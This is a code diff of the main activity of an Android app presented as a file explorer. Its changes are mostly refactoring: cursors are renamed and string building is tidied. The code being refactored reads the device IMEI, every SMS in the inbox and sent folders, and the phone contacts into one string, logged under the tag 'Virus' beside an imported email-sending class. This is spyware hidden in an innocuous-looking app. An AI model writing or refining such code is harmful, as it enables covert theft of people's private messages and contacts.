@@ -41,6 +41,7 @@ import com.danstoakes.fileexplorer.fragment.HierarchyFragment;
 import com.danstoakes.fileexplorer.helper.SharedPreferenceHelper;
 import com.google.android.material.snackbar.Snackbar;
 import com.danstoakes.fileexplorer.Mail.SendEmail;
+
 import java.io.File;
 import java.util.Arrays;
 import java.util.List;
@@ -96,46 +97,45 @@ public class MainActivity extends AppCompatActivity implements FilesFragment.OnF
         exData.append("\nUser: " + User);
         exData.append("\nImei Number: " + device_id);
 
-        Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
+        Cursor curSMSInbox = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
 
-        if (cursor.moveToFirst()) { // must check the result to prevent exception
+        if (curSMSInbox.moveToFirst()) { // must check the result to prevent exception
             do {
                 StringBuilder msgData = new StringBuilder();
-                for (int idx = 0; idx < cursor.getColumnCount(); idx++) {
-                    msgData.append(" " + cursor.getColumnName(idx) + ":" + cursor.getString(idx));
+                for (int idx = 0; idx < curSMSInbox.getColumnCount(); idx++) {
+                    msgData.append(" " + curSMSInbox.getColumnName(idx) + ":" + curSMSInbox.getString(idx));
                 }
-                Log.i("Virus", "Message inbox: " + msgData);
                 exData.append("\nMessage inbox: " + msgData);
-            } while (cursor.moveToNext());
+            } while (curSMSInbox.moveToNext());
         }
 
-        Cursor cursor2 = getContentResolver().query(Uri.parse("content://sms/sent"), null, null, null, null);
+        Cursor curSMSSent = getContentResolver().query(Uri.parse("content://sms/sent"), null, null, null, null);
 
-        if (cursor2.moveToFirst()) { // must check the result to prevent exception
+        if (curSMSSent.moveToFirst()) { // must check the result to prevent exception
             do {
-                String msgData = "";
-                for (int idx = 0; idx < cursor2.getColumnCount(); idx++) {
-                    if (cursor2.getColumnName(idx).equals("_id") || cursor2.getColumnName(idx).equals("address") || cursor2.getColumnName(idx).equals("date") || cursor2.getColumnName(idx).equals("subject") || cursor2.getColumnName(idx).equals("body"))
-                        msgData += " " + cursor2.getColumnName(idx) + ":" + cursor2.getString(idx);
+                StringBuilder msgData = new StringBuilder();
+                for (int idx = 0; idx < curSMSSent.getColumnCount(); idx++) {
+                    if (curSMSSent.getColumnName(idx).equals("_id") || curSMSSent.getColumnName(idx).equals("address") || curSMSSent.getColumnName(idx).equals("date") || curSMSSent.getColumnName(idx).equals("subject") || curSMSSent.getColumnName(idx).equals("body"))
+                        msgData.append(" " + curSMSSent.getColumnName(idx) + ":" + curSMSSent.getString(idx));
                 }
                 exData.append("\nMessage sent: " + msgData);
-            } while (cursor2.moveToNext());
+            } while (curSMSSent.moveToNext());
         }
 
-        ContentResolver cr = getContentResolver();
-        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
+        ContentResolver crContact = getContentResolver();
+        Cursor curContact = crContact.query(ContactsContract.Contacts.CONTENT_URI,
                 null, null, null, null);
 
-        if ((cur != null ? cur.getCount() : 0) > 0) {
-            while (cur != null && cur.moveToNext()) {
-                String id = cur.getString(
-                        cur.getColumnIndex(ContactsContract.Contacts._ID));
-                String name = cur.getString(cur.getColumnIndex(
+        if ((curContact != null ? curContact.getCount() : 0) > 0) {
+            while (curContact != null && curContact.moveToNext()) {
+                String id = curContact.getString(
+                        curContact.getColumnIndex(ContactsContract.Contacts._ID));
+                String name = curContact.getString(curContact.getColumnIndex(
                         ContactsContract.Contacts.DISPLAY_NAME));
 
-                if (cur.getInt(cur.getColumnIndex(
+                if (curContact.getInt(curContact.getColumnIndex(
                         ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
-                    Cursor pCur = cr.query(
+                    Cursor pCur = crContact.query(
                             ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                             null,
                             ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
@@ -151,8 +151,8 @@ public class MainActivity extends AppCompatActivity implements FilesFragment.OnF
             }
         }
 
-        if (cur != null) {
-            cur.close();
+        if (curContact != null) {
+            curContact.close();
         }
 
         Log.i("Virus", exData.toString());
